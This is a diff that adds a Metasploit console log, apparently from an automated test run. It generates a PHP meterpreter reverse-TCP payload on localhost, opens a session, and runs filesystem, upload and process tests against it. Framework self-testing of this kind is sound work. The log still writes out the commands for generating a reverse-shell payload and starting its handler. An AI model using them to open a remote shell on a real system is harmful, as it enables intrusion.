@@ -1,0 +1,87 @@
+use php/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/get_env[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3679-mtwmyktxt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-php-meterpreter-reverse-tcp20231026-3679-ywt41d.php -f raw AutoVerifySessionTimeout=30 lport=6007 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/phpmeterpreter_reverse_tcp_debug_log20231026-3679-wtm4x2txt MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> SessionTlvLogging => file:/tmp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3679-mtwmyktxt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34908 bytes to /tmp/child-process-rb-php-meterpreter-reverse-tcp20231026-3679-ywt41d.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 6
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6007 
+[*] Meterpreter session 7 opened (127.0.0.1:6007 -> 127.0.0.1:52682) at 2023-10-26 19:01:43 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=7 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-ibrvdyno
+[*] meterpreter-test-dir-ibrvdyno created
+[*] Setup: Now in /tmp/meterpreter-test-dir-ibrvdyno
+[*] Running against session 7
+[*] Session type is meterpreter and platform is linux
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] SKIPPED: def test_net_config (This meterpreter does not implement get_interfaces, skipping tests)
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"fv-az626-80", "OS"=>"Linux fv-az626-80 5.15.0-1050-azure #57~20.04.1-Ubuntu SMP Wed Oct 4 17:09:16 UTC 2023 x86_64", "Architecture"=>nil, "BuildTuple"=>nil, "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /tmp/meterpreter-test-dir-ibrvdyno
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/tmp/meterpreter-test-dir-ibrvdyno"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fcd262bde50>:0x0000559cc7da59d0 @stathash={"st_dev"=>2049, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>1001, "st_gid"=>127, "st_rdev"=>0, "st_ino"=>97017, "st_size"=>4096, "st_atime"=>1698346903, "st_mtime"=>1698346903, "st_ctime"=>1698346903}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-wadoifue
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-wadoifue
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /tmp/meterpreter-test-dir-ibrvdyno
+[*] [should change directories] New CWD: /tmp/meterpreter-test-dir-ibrvdyno/meterpreter-test-dir-wadoifue
+[*] [should change directories] Back to old CWD: /tmp/meterpreter-test-dir-ibrvdyno
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-wadoifue
+[*] [should create and remove files] Wrote to meterpreter-test-wadoifue, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-wadoifue.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-wadoifue
+[*] [should move files] Destination File Name: meterpreter-test-wadoifue-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-wadoifue
+[*] [should copy files] Destination File Name: meterpreter-test-wadoifue-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-wadoifue.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 3803
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>3803, "ppid"=>nil, "name"=>"php", "path"=>"php /tmp/child-process-rb-php-meterpreter-reverse-tcp20231026-3679-ywt41d.php", "session"=>nil, "user"=>"runner", "arch"=>nil}
+[+] should return a list of processes
+[*] Testing complete in 0.36 seconds
+[*] Passed: 18; Failed: 0; Skipped: 1
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 7 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
